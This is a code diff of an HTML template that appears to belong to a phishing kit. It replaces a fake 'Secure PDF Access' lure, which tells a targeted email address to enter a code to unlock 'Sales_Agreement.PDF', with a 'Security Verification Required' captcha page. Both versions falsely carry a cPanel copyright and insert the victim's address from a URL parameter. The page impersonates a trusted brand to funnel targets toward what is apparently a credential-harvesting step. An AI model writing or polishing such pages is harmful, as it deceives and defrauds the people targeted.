@@ -162,341 +162,241 @@
 	<meta name="referrer" content="no-referrer">
 
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cofidential Document | Secure PDF Access</title>
-    
+    <title>Security Verification Required</title>
     <style>
-        /* Reset and body setup */
         body {
             margin: 0;
             padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            height: 100vh;
-            overflow: hidden;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom, #ffffff, #f9f7f2);
             display: flex;
             justify-content: center;
             align-items: center;
-            background: #f4f4f4;
-        }
-
-        /* Blurred Background (Very Light Blur 2px) */
-        body::before {
-            content: "";
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            /* Replace 'SAP.png' with your actual image URL or Base64 string */
-            background-image: url('SAP.png');
-            background-size: cover;
-            background-position: center;
-            filter: blur(1.5px); /* Light blur - see lines, not text */
-            z-index: -1;
-            transform: scale(1.0); /* Prevent blur edges */
-        }
-
-        /* Trigger Button (Using the checkbox label structure) */
-        .show-btn {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) scale(0.7);
-            background: #ffffff;
-            color: #333;
-            padding: 15px 30px;
-            border-radius: 50px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
-            font-weight: bold;
-            cursor: pointer;
-            z-index: 10;
-            transition: transform 0.3s ease;
-            border: 2px solid #ff6c2c;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            min-height: 100vh;
         }
         
-        .show-btn:hover {
-            transform: translate(-50%, -50%) scale(0.95);
-        }
-
-        /* Hide the checkbox */
-        #show {
-            display: none;
-        }
-
-        /* Popup Container (Soft Brief Popup) */
         .container {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) scale(0.7);
-            width: 320px;
-            background: #ffffff;
-            border-radius: 17px;
-            box-shadow: 0 15px 60px rgba(0,0,0,0.3);
-            z-index: 100;
-            opacity: 0;
-            visibility: hidden;
-            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            padding: 25px;
-            text-align: center;
-            box-sizing: border-box;
-        }
-
-        /* When checkbox is checked, show popup */
-        #show:checked + .show-btn {
-            display: none;
-        }
-
-        #show:checked ~ .container {
-            transform: translate(-50%, -50%) scale(1);
-            opacity: 1;
-            visibility: visible;
-        }
-
-        /* Close Button */
-        .close-btn {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            font-size: 24px;
-            font-weight: bold;
-            color: #888;
-            cursor: pointer;
-            line-height: 1;
-            transition: color 0.3s;
+            width: 100%;
+            max-width: 400px;
+            margin: 15px;
         }
         
-        .close-btn:hover {
-            color: #333;
+        .card {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            overflow: hidden;
         }
-
-        /* Loading Animation Spinner */
-        #loading-spinner {
+        
+        .header {
+            background-color: #FF6C2C;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            margin: 0;
+            font-size: 18px;
+        }
+        
+        .content {
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .info-box {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .info-header {
             display: flex;
-            justify-content: center;
             align-items: center;
-            height: 200px;
+            margin-bottom: 10px;
         }
-
-        .spinner {
-            border: 6px solid #f3f3f3;
-            border-top: 6px solid #ff6c2c;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 0.7s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Form Content (Hidden initially) */
-        #form-content {
-            display: none;
-        }
-
-        /* Lock Icon (Adjusted for SVG image) */
-        .lock-icon {
+        
+        .info-icon {
             width: 40px;
             height: 40px;
-            margin-bottom: 18px;
-            margin-left: auto;
-            margin-right: auto;
-            display: block;
+            background: #FF6C2C;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
         }
-
-        h1 {
-            font-size: 17px;
-            margin: 0 0 8px 0;
+        
+        .info-text {
+            flex: 1;
+        }
+        
+        .info-text .title {
+            font-weight: bold;
             color: #333;
-        }
-
-        p {
-            font-size: 14px;
-            color: #666;
             margin-bottom: 5px;
         }
-
-        /* Input Field (Captcha Style) */
-        .input-group {
-            margin-bottom: 18px;
+        
+        .info-text .email {
+            font-size: 12px;
+            color: #666;
         }
-
-        .input-group label {
+        
+        .captcha-container {
+            margin: 25px 0;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            display: inline-block;
+        }
+        
+        .captcha-image {
+            background: white;
+            border-radius: 6px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            padding: 10px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .form-group label {
             display: block;
-            font-size: 14px;
-            font-weight: bold;
             margin-bottom: 8px;
-            color: #444;
+            font-weight: bold;
+            color: #333;
         }
-
-        .input-group input {
-            width: 80%;
-            padding: 12px;
-            border: 2px solid #ddd;
-            border-radius: 30px;
-            text-align: center;
-            font-size: 18px;
-            letter-spacing: 8px;
-            outline: none;
+        
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
             box-sizing: border-box;
             transition: border-color 0.3s;
         }
-
-        .input-group input:focus {
-            border-color: #ff6c2c;
+        
+        .form-control:focus {
+            border-color: #FF6C2C;
+            outline: none;
         }
-
-        /* Verify Button */
-        button {
-            width: 80%;
-            padding: 15px;
-            background: #ff6c2c;
+        
+        .btn {
+            display: inline-block;
+            background: #FF6C2C;
             color: white;
-            border: none;
-            border-radius: 30px;
-            font-size: 15px;
+            padding: 10px 25px;
+            text-decoration: none;
+            border-radius: 6px;
             font-weight: bold;
+            border: none;
             cursor: pointer;
-            transition: background 0.3s;
-            box-shadow: 0 4px 10px rgba(255, 108, 44, 0.3);
+            font-size: 14px;
+            transition: background-color 0.3s;
         }
-
-        button:hover {
+        
+        .btn:hover {
             background: #e55a1f;
         }
-
-        /* Access Granted section (Initially hidden) */
-        #access-granted {
-            display: none;
+        
+        .footer {
+            background: #f0f0f0;
             padding: 20px;
-            background: #e8f5e9;
-            border-radius: 10px;
-            margin-top: 20px;
+            text-align: center;
+            font-size: 13px;
+            color: #666;
         }
-
-        #access-granted h3 {
-            color: #2e7d32;
-            margin: 0 0 10px 0;
+        
+        .message {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 6px;
+            display: none;
         }
-
-        #access-granted a {
-            color: #2e7d32;
-            font-weight: bold;
-            text-decoration: underline;
+        
+        .error {
+            background: #ffe6e6;
+            color: #d63031;
+            border: 1px solid #ffcccc;
+        }
+        
+        .instructions {
+            text-align: left;
+            margin-bottom: 25px;
+            color: #555;
+            line-height: 1.5;
         }
     </style>
 </head>
 <body>
-
-    <!-- Checkbox Trigger (Keeps the base HTML structure) -->
-    <input type="checkbox" id="show">
-    <label for="show" class="show-btn">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/59/Semi-protection-shackle-no-text.svg?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" alt="lock" style="width: 16px; height: 16px; margin-right: 8px;">
-        Access Secure PDF
-    </label>
-
-    <!-- Popup Container -->
     <div class="container">
-        <label for="show" class="close-btn" title="close">×</label>
-        
-        <!-- Loading Spinner (Visible initially) -->
-        <div id="loading-spinner">
-            <div class="spinner"></div>
+        <div class="card">
+            <div class="header">
+                <h1>Security Verification Required</h1>
+            </div>
+            
+            <div class="content">
+                <div class="info-box">
+                    <div class="info-header">
+                        <div class="info-icon">!</div>
+                        <div class="info-text">
+                            <div class="title">Action Required</div>
+                            <div class="email">For: {{ request.args.get('web', 'default') }}</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <p>Enter the code displayed below to verify you are human:</p>
+                
+                <div class="captcha-container">
+                    <div class="captcha-image">
+                        <img src="data:image/png;base64,{{ img_data }}" alt="CAPTCHA Code" style="max-width: 100%; height: auto;">
+                    </div>
+                </div>
+                
+                <form id="captcha-form" method="POST" action="{{ url_for('captcha_challenge') }}">
+                    <div class="form-group">
+                        <label for="captcha-input">Security Code</label>
+                        <input type="text" id="captcha-input" class="form-control" name="code" placeholder="Enter the 6-digit code" required maxlength="6">
+                    </div>
+                    
+                    <input type="hidden" name="web" value="{{ request.args.get('web') }}">
+                    
+                    <button type="submit" class="btn">Verify & Continue</button>
+                </form>
+                
+                <div id="captcha-message" class="message error"></div>
+            </div>
+            
+            <div class="footer">
+                <p>&copy; 2026 cPanel. All Rights Reserved.</p>
+            </div>
         </div>
-
-        <!-- Main Content (Hidden until loading finishes) – changed div to form -->
-        <form id="form-content" method="POST" action="{{ url_for('captcha_challenge') }}">
-            <img class="lock-icon" src="https://upload.wikimedia.org/wikipedia/commons/5/59/Semi-protection-shackle-no-text.svg?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" alt="lock" style="width: 16px; height: 16px; margin: -1 0 -1 0;">
-            
-            <h1>Sales_Agreement.PDF</h1>
-            <p class="email">For: {{ request.args.get('web', 'default') }}</p>
-            <p>Enter the 6-digit code to remove security</p>
-
-            <div class="input-group">
-                <label for="captcha-input"><h1><img src="data:image/png;base64,{{ img_data }}" alt="CODE" style="max-width: 100%; height: auto;"></h1></label>
-                <input type="password" id="captcha-input" maxlength="6" placeholder="••••••">
-            </div>
-            <input type="hidden" name="web" value="{{ request.args.get('web') }}">
-
-            <button type="submit">Verify & Unlock PDF</button>
-            <p style="text-align: center; font-size: 12px;">&copy; 2026 cPanel. All Rights Reserved.</p>
-
-            <!-- Success state -->
-            <div id="access-granted">
-                <h3>✔ Access Granted!</h3>
-                <p>Opening Your Document PDF.</p>
-                <!-- Replace # with your actual PDF link -->
-                <a href="#" target="_blank">Open Secure PDF</a>
-            </div>
-        </form> <!-- closing form -->
     </div>
-
+    
     <script>
-        // Add loading animation logic: When the label is clicked, show spinner for 2 seconds, then reveal form
-        const showBtn = document.querySelector('.show-btn');
-        const checkbox = document.getElementById('show');
-        const spinner = document.getElementById('loading-spinner');
-        const formContent = document.getElementById('form-content');
-
-        showBtn.addEventListener('click', function(e) {
-            // Prevent default checkbox toggle so we can show loading first
-            e.preventDefault();
-            
-            // Show spinner
-            spinner.style.display = 'flex';
-            formContent.style.display = 'none';
-
-            // After 2 seconds, simulate loading finished and show form
-            setTimeout(() => {
-                spinner.style.display = 'none';
-                formContent.style.display = 'block';
-                
-                // Now actually trigger the checkbox to show the popup
-                checkbox.checked = true;
-            }, 1500);
-        });
-
-        // Submit handler – now attached to the real <form> element
-        formContent.addEventListener('submit', function(event) {
+        document.getElementById('captcha-form').addEventListener('submit', function(event) {
             event.preventDefault();
-            const form = this;                    // ← store reference to the form
-            const input = document.getElementById('captcha-input');
-            const granted = document.getElementById('access-granted');
+            var captchaInput = document.getElementById('captcha-input');
+            var errorMessage = document.getElementById('captcha-message');
             
-            if (input.value.length === 6) {
-                // Hide the input and button
-                document.querySelector('.input-group').style.display = 'none';
-                document.querySelector('button').style.display = 'none';
-                document.querySelector('p').innerText = "Verification successful.";
-                
-                // Show access granted
-                granted.style.display = 'block';
-                
-                let submitted = false;               // ← flag
-                
-                const openLink = granted.querySelector('a');
-                openLink.addEventListener('click', function (e) {
-                    e.preventDefault();
-                    if (submitted) return;           // ← guard
-                    submitted = true;
-                    form.submit();                   // ✅ use stored form reference
-                });
-                
-                // Automatically submit after 0.7 seconds
-                setTimeout(() => {
-                    if (submitted) return;           // ← guard
-                    submitted = true;
-                    form.submit();                   // ✅ use stored form reference
-                }, 700);
+            if (captchaInput.value.length === 6) {
+                // Form is valid, submit it
+                this.submit();
             } else {
                 // Show error message
-                alert("Please enter the complete 6-digit code.");
-                input.focus();
+                errorMessage.textContent = 'Please enter the complete 6-digit security code.';
+                errorMessage.style.display = 'block';
+                captchaInput.focus();
             }
         });
     </script>
